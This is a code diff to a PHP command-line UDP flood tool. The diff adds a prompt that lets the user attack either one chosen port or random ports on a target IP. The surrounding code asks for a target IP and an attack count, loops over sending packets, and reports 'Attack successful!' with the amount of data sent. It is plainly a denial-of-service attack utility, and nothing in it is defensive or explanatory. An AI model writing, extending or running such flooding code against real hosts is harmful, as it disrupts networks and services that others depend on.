@@ -9,7 +9,25 @@ namespace UDPFlood {
 
 	echo "\x1b[38;5;145mTarget IP: ";
 	$ip = trim(fgets(STDIN));
+
+	echo "\x1b[38;5;145mAttack to Random Port?(y/n): ";
+	$r_check = trim(fgets(STDIN));
 	
+	while($r_check != "y" && $r_check != "n"){
+		echo "\x1b[38;5;124mError: Please select y or n" . PHP_EOL;
+		echo "\x1b[38;5;145mAttack to Random Port?(y/n): ";
+		$r_check = trim(fgets(STDIN));
+	}
+	
+	if($r_check == "n"){
+		echo "\x1b[38;5;145mTarget Port: ";
+		$port = trim(fgets(STDIN));
+		while(!is_numeric($port) || $port > 65535 || $port < 0){
+			echo "\x1b[38;5;124mError: It's not a valid number" . PHP_EOL;
+			echo "\x1b[38;5;145mAttack Port: ";
+			$port = trim(fgets(STDIN));
+		}
+	}
 	echo "\x1b[38;5;145mAttack count: ";
 	$count = trim(fgets(STDIN));
 	
@@ -23,7 +41,9 @@ namespace UDPFlood {
 	
 	while(true){
 		//usleep(100000);
-		$port = mt_rand(1,65000);
+		if($r_check == "y"){
+			$port = mt_rand(0,65535);
+		}
 		
 		if($attackcount >= $count){
 			echo "\x1b[38;5;37mAttack successful! " . round(($attackcount * 20) / 1024, 2) . " MB packets sended." . PHP_EOL . "\x1b[m";
